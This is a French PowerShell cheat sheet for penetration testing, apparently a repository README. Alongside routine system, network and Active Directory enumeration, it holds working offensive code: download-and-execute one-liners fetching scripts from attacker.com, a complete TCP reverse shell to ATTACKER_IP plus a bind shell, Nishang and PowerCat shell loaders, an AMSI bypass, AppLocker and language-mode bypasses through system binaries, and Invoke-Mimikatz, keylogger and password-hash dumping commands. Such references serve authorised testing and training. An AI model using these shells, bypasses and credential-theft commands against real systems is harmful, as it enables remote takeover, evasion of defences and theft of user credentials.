# 💻 PowerShell — fiche pratique complète pour les tests d’intrusion

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗     
  ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝██║     ██║     
  ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝███████╗███████║█████╗  ██║     ██║     
  ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗╚════██║██╔══██║██╔══╝  ██║     ██║     
  ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║███████║██║  ██║███████╗███████╗███████╗
  ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/PowerShell-blue?style=for-the-badge&logo=powershell" alt="PowerShell">
  <img src="https://img.shields.io/badge/Windows-Hacking-red?style=for-the-badge" alt="Hacking">
  <img src="https://img.shields.io/badge/Post_Exploitation-orange?style=for-the-badge" alt="Post-Exploitation">
</p>

---

> **Versions et environnement :** cette fiche reprend surtout Windows PowerShell et les modules Windows ; elle ne constitue pas une liste de commandes universelles pour PowerShell 7. `Get-WmiObject` et `Get-EventLog` ne sont pas disponibles dans PowerShell 7, et les alias `wget`/`curl` varient selon la version. Les modules ActiveDirectory, GroupPolicy et les fonctions Defender doivent être présents. Voir les [différences officielles entre Windows PowerShell et PowerShell 7](https://learn.microsoft.com/en-us/powershell/scripting/whats-new/differences-from-windows-powershell).
>
> **Portée de la stratégie :** `Process` concerne la session, tandis que `CurrentUser` persiste pour l’utilisateur. Une stratégie d’exécution n’est pas une frontière de sécurité ; une stratégie de groupe peut aussi avoir priorité. Voir [about_Execution_Policies](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies).
>
> **Exemples conservés :** les formes `dir /a:h`, `dir /r` et `more < ...` proviennent de l’interpréteur `cmd.exe` et ne s’emploient pas telles quelles avec les alias PowerShell. L’extrait C# d’AMSI ne contient que des déclarations et une ellipse : ce n’est pas un contournement complet. Les méthodes de contournement historiques ne garantissent pas leur fonctionnement sur une version actuelle. PowerShell 2.0 est [retiré de versions récentes de Windows](https://support.microsoft.com/en-us/servicing/os/windows/docs/2025/08/powershell-2-0-removal-from-windows).

## 📋 Table des matières

- [Notions de base](#-notions-de-base)
- [Énumération du système](#-énumération-du-système)
- [Énumération des utilisateurs](#-énumération-des-utilisateurs)
- [Commandes réseau](#-commandes-réseau)
- [Opérations sur les fichiers](#-opérations-sur-les-fichiers)
- [Gestion des processus et des services](#-gestion-des-processus-et-des-services)
- [Opérations sur le Registre](#-opérations-sur-le-registre)
- [Active Directory](#-active-directory)
- [Téléchargement et exécution](#-téléchargement-et-exécution)
- [Connexions shell inversées (reverse shells)](#-connexions-shell-inversées-reverse-shells)
- [Techniques de contournement](#-techniques-de-contournement)
- [Outils offensifs](#-outils-offensifs)
- [Commandes en une ligne](#-commandes-en-une-ligne)

---

## 🔰 Notions de base

### Stratégie d’exécution

```powershell
# Vérifier la stratégie actuelle
Get-ExecutionPolicy
Get-ExecutionPolicy -List

# Contourner la stratégie d’exécution (portée indiquée par chaque commande)
Set-ExecutionPolicy Bypass -Scope Process
Set-ExecutionPolicy Unrestricted -Scope CurrentUser

# Exécuter un script en contournant la stratégie
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -File script.ps1
```

### Obtenir de l’aide

```powershell
# Obtenir l’aide d’une commande
Get-Help Get-Process
Get-Help Get-Process -Full
Get-Help Get-Process -Examples

# Mettre l’aide à jour
Update-Help

# Lister toutes les commandes
Get-Command
Get-Command -Module ActiveDirectory
Get-Command *process*
```

### Variables et opérateurs

```powershell
# Variables
$var = "value"
$number = 42
$array = @(1, 2, 3)
$hash = @{key="value"; name="test"}

# Variables d’environnement
$env:USERNAME
$env:COMPUTERNAME
$env:USERDOMAIN
$env:PATH
Get-ChildItem Env:

# Opérateurs de comparaison
-eq   # Égal à
-ne   # Différent de
-gt   # Supérieur à
-lt   # Inférieur à
-like # Correspondance avec caractères génériques
-match # Correspondance avec une expression régulière
```

### Pipelines et filtrage

```powershell
# Transmettre la sortie dans un pipeline
Get-Process | Where-Object {$_.CPU -gt 10}
Get-Service | Where-Object Status -eq "Running"

# Sélectionner des propriétés
Get-Process | Select-Object Name, CPU, Id
Get-Process | Select-Object -First 5

# Trier
Get-Process | Sort-Object CPU -Descending

# Mettre la sortie en forme
Get-Process | Format-Table -AutoSize
Get-Process | Format-List *
Get-Process | Out-GridView
```

---

## 🔍 Énumération du système

### Informations système

```powershell
# Informations sur l’ordinateur
Get-ComputerInfo
systeminfo
hostname
$env:COMPUTERNAME

# Version du système d’exploitation
[System.Environment]::OSVersion
(Get-WmiObject Win32_OperatingSystem).Caption
(Get-CimInstance Win32_OperatingSystem).Version

# Architecture
[Environment]::Is64BitOperatingSystem
$env:PROCESSOR_ARCHITECTURE

# Correctifs et mises à jour
Get-HotFix
Get-HotFix | Where-Object InstalledOn -gt (Get-Date).AddDays(-30)
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Logiciels installés

```powershell
# Logiciels 64 bits
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, Publisher, InstallDate

# Logiciels 32 bits sur un système 64 bits
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, Publisher, InstallDate

# Avec WMI
Get-WmiObject -Class Win32_Product | Select-Object Name, Version

# Liste rapide
Get-Package
```

> **Précision sur l’inventaire :** la requête `Win32_Product` peut déclencher une vérification et une réparation des installations MSI ; ce n’est pas une simple lecture sans effet secondaire. Voir la [documentation Microsoft sur cet inventaire](https://devblogs.microsoft.com/scripting/use-powershell-to-find-installed-software/).

### Antivirus et sécurité

```powershell
# Identifier l’antivirus
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
Get-MpComputerStatus  # Windows Defender

# État du pare-feu
Get-NetFirewallProfile
netsh advfirewall show allprofiles

# Règles du pare-feu
Get-NetFirewallRule | Where-Object Enabled -eq True
Get-NetFirewallRule -DisplayName "*Remote*"

# Exclusions de Windows Defender
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
```

### Tâches planifiées

```powershell
# Lister les tâches planifiées
Get-ScheduledTask
Get-ScheduledTask | Where-Object State -eq "Ready"

# Détails d’une tâche
Get-ScheduledTask -TaskName "TaskName" | Get-ScheduledTaskInfo

# schtasks
schtasks /query /fo LIST /v
```

---

## 👤 Énumération des utilisateurs

### Utilisateurs locaux

```powershell
# Utilisateur actuel
whoami
$env:USERNAME
[Environment]::UserName
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# Tous les utilisateurs locaux
Get-LocalUser
Get-LocalUser | Select-Object Name, Enabled, LastLogon
net user

# Détails d’un utilisateur
Get-LocalUser Administrator
net user Administrator

# Groupes de l’utilisateur
Get-LocalGroupMember Administrators
net localgroup Administrators
```

### Privilèges utilisateur

```powershell
# Privilèges actuels
whoami /priv
whoami /all
whoami /groups

# Vérifier l’appartenance au groupe des administrateurs
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
```

### Groupes

```powershell
# Lister les groupes locaux
Get-LocalGroup
net localgroup

# Membres des groupes
Get-LocalGroupMember "Administrators"
Get-LocalGroupMember "Remote Desktop Users"
net localgroup "Administrators"
```

### Utilisateurs connectés

```powershell
# Sessions actuellement ouvertes
query user
quser
qwinsta

# Connexions récentes
Get-WmiObject Win32_LogonSession | Select-Object LogonId, LogonType, StartTime
Get-EventLog -LogName Security -InstanceId 4624 -Newest 10
```

---

## 🌐 Commandes réseau

### Configuration réseau

```powershell
# Configuration IP
Get-NetIPConfiguration
Get-NetIPAddress
ipconfig /all

# DNS
Get-DnsClientServerAddress
ipconfig /displaydns

# Routes
Get-NetRoute
route print

# Table ARP
Get-NetNeighbor
arp -a
```

### Ports ouverts et connexions

```powershell
# Connexions TCP
Get-NetTCPConnection
Get-NetTCPConnection -State Listen
Get-NetTCPConnection | Where-Object State -eq "Established"
netstat -ano

# Points de terminaison UDP
Get-NetUDPEndpoint

# Identifier le processus associé à un port
Get-NetTCPConnection -LocalPort 80 | Select-Object OwningProcess
Get-Process -Id (Get-NetTCPConnection -LocalPort 80).OwningProcess
```

### Tests réseau

```powershell
# Ping
Test-Connection google.com
Test-Connection -ComputerName 192.168.1.1 -Count 4

# Vérifier un port
Test-NetConnection -ComputerName 192.168.1.1 -Port 445
Test-NetConnection -ComputerName google.com -Port 443

# Tracer l’itinéraire réseau
Test-NetConnection -ComputerName google.com -TraceRoute

# Résolution DNS
Resolve-DnsName google.com
nslookup google.com
```

### Partages réseau

```powershell
# Lister les partages
Get-SmbShare
net share

# Connecter un lecteur réseau
New-PSDrive -Name Z -PSProvider FileSystem -Root "\\server\share"
net use Z: \\server\share

# Lister les partages connectés
Get-SmbConnection
net use

# Accéder à un partage
Get-ChildItem \\server\share
dir \\192.168.1.1\c$
```

---

## 📁 Opérations sur les fichiers

### Navigation et listes de fichiers

```powershell
# Répertoire courant
Get-Location
pwd

# Changer de répertoire
Set-Location C:\Users
cd C:\Users

# Lister les fichiers
Get-ChildItem
Get-ChildItem -Force  # Inclure les éléments masqués
Get-ChildItem -Recurse
ls
dir

# Lister les fichiers masqués
Get-ChildItem -Hidden
Get-ChildItem -Attributes Hidden
dir /a:h
```

### Recherche de fichiers

```powershell
# Rechercher des fichiers par nom
Get-ChildItem -Path C:\ -Recurse -Name "*.txt" -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Recurse -Filter "password*" -ErrorAction SilentlyContinue

# Rechercher des fichiers contenant un texte
Get-ChildItem -Recurse | Select-String "password"
Select-String -Path "C:\*.txt" -Pattern "password"

# Rechercher les fichiers volumineux
Get-ChildItem -Recurse | Where-Object Length -gt 100MB

# Rechercher les fichiers récemment modifiés
Get-ChildItem -Recurse | Where-Object LastWriteTime -gt (Get-Date).AddDays(-7)
```

### Lecture et écriture de fichiers

```powershell
# Lire un fichier
Get-Content file.txt
Get-Content file.txt -Head 10
Get-Content file.txt -Tail 10
type file.txt
cat file.txt

# Écrire dans un fichier
Set-Content file.txt "content"
Add-Content file.txt "append"
"content" | Out-File file.txt
"content" >> file.txt  # Ajouter à la fin

# Copier, déplacer ou supprimer
Copy-Item source.txt destination.txt
Move-Item source.txt destination.txt
Remove-Item file.txt
Remove-Item folder -Recurse -Force
```

### Flux de données alternatifs (ADS)

```powershell
# Lister les flux ADS
Get-Item file.txt -Stream *
dir /r file.txt

# Lire un flux ADS
Get-Content file.txt -Stream secret
more < file.txt:secret

# Écrire dans un flux ADS
Set-Content file.txt -Stream hidden "secret data"
echo "data" > file.txt:hidden

# Supprimer un flux ADS
Remove-Item file.txt -Stream hidden
```

### Calcul d’empreintes

```powershell
# Calculer l’empreinte d’un fichier
Get-FileHash file.txt
Get-FileHash file.txt -Algorithm MD5
Get-FileHash file.txt -Algorithm SHA256
Get-FileHash file.txt -Algorithm SHA512

# Vérifier une empreinte
(Get-FileHash file.txt).Hash -eq "expected_hash"
```

---

<a id="-gestion-des-processus-et-des-services"></a>
## ⚙️ Gestion des processus et des services

### Processus

```powershell
# Lister les processus
Get-Process
Get-Process | Sort-Object CPU -Descending
Get-Process -Name "chrome"
tasklist

# Détails d’un processus
Get-Process -Id 1234 | Format-List *
Get-WmiObject Win32_Process | Select-Object Name, ProcessId, CommandLine

# Démarrer un processus
Start-Process notepad.exe
Start-Process -FilePath "cmd.exe" -ArgumentList "/c whoami"
Start-Process -FilePath "powershell.exe" -Verb RunAs  # En tant qu’administrateur

# Arrêter un processus
Stop-Process -Name "notepad"
Stop-Process -Id 1234 -Force
taskkill /PID 1234 /F
```

### Services

```powershell
# Lister les services
Get-Service
Get-Service | Where-Object Status -eq "Running"
Get-Service | Where-Object StartType -eq "Automatic"
sc query

# Détails d’un service
Get-Service -Name "WinRM" | Format-List *
Get-WmiObject Win32_Service | Select-Object Name, StartMode, PathName

# Démarrer ou arrêter des services
Start-Service -Name "WinRM"
Stop-Service -Name "WinRM"
Restart-Service -Name "WinRM"
net start WinRM
net stop WinRM

# Chemin du service (pour rechercher les chemins sans guillemets)
Get-WmiObject Win32_Service | Select-Object Name, PathName | Where-Object {$_.PathName -notlike '"*'}
```

---

> **Précision sur `sc` :** sous Windows PowerShell 5.1, `sc` est un alias de `Set-Content`, pas une invocation implicite de l’outil de contrôle des services. La ligne source `sc query` est conservée ; l’exécutable de contrôle des services se nomme `sc.exe`. Voir la [documentation de Set-Content](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-content?view=powershell-5.1).

## 📝 Opérations sur le Registre

### Lecture du Registre

```powershell
# Lister les clés du Registre
Get-ChildItem HKLM:\SOFTWARE
Get-ChildItem HKCU:\SOFTWARE

# Lire une valeur du Registre
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemPropertyValue HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name "SecurityHealth"

# Rechercher dans le Registre
Get-ChildItem HKLM:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "password"}
```

### Écriture dans le Registre

```powershell
# Créer une clé
New-Item -Path HKCU:\SOFTWARE\MyKey

# Définir une valeur
Set-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "Value" -Value "Data"
New-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "NewValue" -Value "Data" -PropertyType String

# Supprimer
Remove-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "Value"
Remove-Item -Path HKCU:\SOFTWARE\MyKey -Recurse
```

### Emplacements importants du Registre

```powershell
# Emplacements d’exécution automatique
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Désinstallation (logiciels installés)
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*

# SAM (nécessite les droits SYSTEM)
# HKLM:\SAM\SAM

# Secrets LSA
# HKLM:\SECURITY\Policy\Secrets
```

---

## 🏢 Active Directory

### Informations sur le domaine

```powershell
# Informations sur le domaine
Get-ADDomain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$env:USERDNSDOMAIN

# Contrôleurs de domaine
Get-ADDomainController
Get-ADDomainController -Filter * | Select-Object Name, IPv4Address

# Informations sur la forêt
Get-ADForest

# Relations d’approbation
Get-ADTrust -Filter *
```

### Énumération des utilisateurs (AD)

```powershell
# Tous les utilisateurs du domaine
Get-ADUser -Filter *
Get-ADUser -Filter * -Properties *
Get-ADUser -Filter * | Select-Object Name, SamAccountName, Enabled

# Utilisateur précis
Get-ADUser -Identity administrator -Properties *

# Utilisateurs ayant une propriété précise
Get-ADUser -Filter {AdminCount -eq 1}  # Administrateurs
Get-ADUser -Filter {ServicePrincipalName -ne "$null"}  # Comptes potentiellement concernés par le Kerberoasting

# Rechercher des utilisateurs
Get-ADUser -Filter {Name -like "*admin*"}
Get-ADUser -Filter {Description -like "*password*"}
```

### Énumération des groupes (AD)

```powershell
# Tous les groupes
Get-ADGroup -Filter *

# Groupe Domain Admins
Get-ADGroupMember "Domain Admins"
Get-ADGroupMember "Domain Admins" -Recursive

# Groupe Enterprise Admins
Get-ADGroupMember "Enterprise Admins"

# Groupes d’un utilisateur
Get-ADPrincipalGroupMembership username
```

### Énumération des ordinateurs (AD)

```powershell
# Tous les ordinateurs
Get-ADComputer -Filter *
Get-ADComputer -Filter * -Properties *

# Contrôleurs de domaine
Get-ADComputer -Filter {PrimaryGroupId -eq 516}

# Serveurs
Get-ADComputer -Filter {OperatingSystem -like "*Server*"}
```

### Informations sur les GPO

```powershell
# Lister les GPO
Get-GPO -All
Get-GPO -All | Select-Object DisplayName, GpoStatus

# Détails d’une GPO
Get-GPO -Name "Default Domain Policy"

# Rapport sur une GPO
Get-GPOReport -Name "Default Domain Policy" -ReportType HTML -Path report.html
```

---

<a id="-téléchargement-et-exécution"></a>
## ⬇️ Téléchargement et exécution

### Téléchargement de fichiers

```powershell
# Invoke-WebRequest (équivalent de wget/curl selon la version)
Invoke-WebRequest -Uri "http://attacker.com/file.exe" -OutFile "file.exe"
iwr -Uri "http://attacker.com/file.exe" -OutFile "file.exe"
wget "http://attacker.com/file.exe" -OutFile "file.exe"

# WebClient (présenté comme plus rapide dans le document source)
(New-Object Net.WebClient).DownloadFile("http://attacker.com/file.exe", "C:\file.exe")

# Télécharger une chaîne de texte (pour les scripts)
(New-Object Net.WebClient).DownloadString("http://attacker.com/script.ps1")

# Invoke-RestMethod
Invoke-RestMethod -Uri "http://attacker.com/file.exe" -OutFile "file.exe"

# Transfert BITS (présenté comme plus discret dans le document source)
Start-BitsTransfer -Source "http://attacker.com/file.exe" -Destination "file.exe"

# certutil (binaire système détournable, ou LOLBin)
certutil -urlcache -split -f "http://attacker.com/file.exe" file.exe
```

### Téléchargement et exécution en mémoire

```powershell
# IEX — Invoke-Expression (sans fichier de script enregistré)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
IEX (iwr 'http://attacker.com/script.ps1')

# Avec une variable
$script = (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
IEX $script

# Invoke-Command
Invoke-Command -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')}
```

### Exécution encodée

```powershell
# Encoder une commande en Base64
$command = "whoami"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
echo $encoded

# Exécuter la commande encodée
powershell -enc <base64_string>
powershell -EncodedCommand <base64_string>

# Encodeur en une commande
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"))
```

---

## 🔌 Connexions shell inversées (reverse shells)

### Shell inversé PowerShell

```powershell
# Shell inversé TCP
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

### Shell inversé en une commande

```powershell
# Nishang
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444

# PowerCat
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/powercat.ps1')
powercat -c ATTACKER_IP -p 4444 -e cmd

# Powerline
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Shell en écoute (bind shell)

```powershell
# Mettre un port en écoute
$listener = [System.Net.Sockets.TcpListener]4444
$listener.Start()
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
$listener.Stop()
```

---

<a id="-techniques-de-contournement"></a>
## 🛡️ Techniques de contournement

### Contournement de la stratégie d’exécution

```powershell
# Méthodes de contournement
powershell -ep bypass
powershell -ExecutionPolicy Bypass
Set-ExecutionPolicy Bypass -Scope Process

# Lire le script et le transmettre dans un pipeline
Get-Content script.ps1 | PowerShell -NoProfile -
type script.ps1 | PowerShell -NoProfile -

# Télécharger une chaîne de texte (sans fichier de script sur disque)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
```

### Contournement d’AMSI

```powershell
# Contournement simple d’AMSI (peut être détecté)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Version obscurcie
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Modification de la mémoire (droits administrateur indiqués dans la source)
$win32 = @"
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $win32
# ... (code complet de contournement non fourni)
```

### Contournement du mode de langage contraint

```powershell
# Vérifier le mode de langage
$ExecutionContext.SessionState.LanguageMode

# Si le mode est ConstrainedLanguage, la source propose :
# - PowerShell 2.0 (si disponible)
powershell -version 2

# - InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

### Contournement d’AppLocker

```powershell
# MSBuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

# InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false payload.exe

# Regasm/Regsvcs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll

# Examiner les règles AppLocker
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

---

## 🔫 Outils offensifs

### PowerSploit

```powershell
# Télécharger
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerSploit/Recon/PowerView.ps1')

# PowerView (énumération AD)
Get-NetDomain
Get-NetUser
Get-NetGroup
Get-NetComputer
Find-LocalAdminAccess
Invoke-UserHunter

# PowerUp (élévation de privilèges)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerUp.ps1')
Invoke-AllChecks

# Invoke-Mimikatz
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

### Empire / PowerShell Empire

```powershell
# Exécution d’un stager (depuis Empire)
powershell -noP -sta -w 1 -enc <base64_payload>
```

### Nishang

```powershell
# Shell inversé
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Shells/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444

# Enregistreur de frappes clavier
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Gather/Keylogger.ps1')
Keylogger

# Get-PassHashes
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Gather/Get-PassHashes.ps1')
Get-PassHashes
```

---

## ⚡ Commandes en une ligne

### Énumération en une commande

```powershell
# Informations système
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Utilisateurs
Get-LocalUser | Select Name,Enabled

# Logiciels installés
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName

# Ports ouverts
Get-NetTCPConnection -State Listen | Select LocalAddress,LocalPort,OwningProcess

# Services en cours d’exécution
Get-Service | Where Status -eq Running | Select Name,DisplayName

# Tâches planifiées
schtasks /query /fo TABLE | findstr /v "TaskName"

# État de l’antivirus
Get-MpComputerStatus | Select RealTimeProtectionEnabled,IoavProtectionEnabled

# Pare-feu
Get-NetFirewallProfile | Select Name,Enabled
```

### Téléchargement en une commande

```powershell
# Téléchargement avec PowerShell
(New-Object Net.WebClient).DownloadFile("http://url/file","C:\file")
IEX (New-Object Net.WebClient).DownloadString("http://url/script.ps1")
Invoke-WebRequest -Uri "http://url/file" -OutFile "file"

# certutil
certutil -urlcache -split -f "http://url/file" file

# bitsadmin
bitsadmin /transfer job /download /priority high http://url/file C:\file
```

### Tableau des commandes

| Objectif | Commande |
|---------|---------|
| Utilisateur actuel | `whoami` |
| Tous les utilisateurs | `Get-LocalUser` |
| Administrateurs | `Get-LocalGroupMember Administrators` |
| Informations système | `systeminfo` |
| Configuration IP | `Get-NetIPAddress` |
| Ports ouverts | `Get-NetTCPConnection -State Listen` |
| Processus | `Get-Process` |
| Services | `Get-Service \| Where Status -eq Running` |
| Rechercher des fichiers | `Get-ChildItem -Recurse -Filter "*.txt"` |
| Rechercher dans le contenu | `Select-String -Path "C:\*" -Pattern "password"` |
| Télécharger un fichier | `(New-Object Net.WebClient).DownloadFile("url","file")` |
| Exécution encodée | `powershell -enc <base64>` |

---

## 📚 Ressources

- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
- [Nishang](https://github.com/samratashok/nishang)
- [PowerShell Empire](https://github.com/EmpireProject/Empire)
- [LOLBAS](https://lolbas-project.github.io/)
- [HackTricks PowerShell](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)

### Fiches connexes
- [Mimikatz](../../Mimikatz/translations/README.fr.md)
- [Élévation de privilèges Windows](../../Windows-PrivEsc/README.md)
- [Metasploit](../../Metasploit/translations/README.fr.md)

---

<p align="center">
  <b>💻 Maîtrisez PowerShell pour les tests d’intrusion !</b><br>
  <i>Le langage de script Windows présenté comme le plus puissant dans la source</i>
</p>
